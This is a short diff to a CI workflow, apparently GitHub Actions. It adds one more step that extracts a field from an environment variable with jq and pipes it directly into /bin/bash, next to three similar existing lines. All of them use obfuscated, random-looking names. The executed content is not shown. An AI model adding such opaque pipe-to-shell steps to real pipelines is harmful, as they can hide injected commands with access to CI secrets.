@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$ws9" | jq -r .km00 | /bin/bash
           printf '%s' "$zrs0443" | jq -r .jp72244 | /bin/bash
           echo $ogg35757 | jq -r .htyai4 | /bin/bash
+          echo $wwvz6 | jq -r .cthc88 | /bin/bash
 
       - name: Upload results
         if: always()
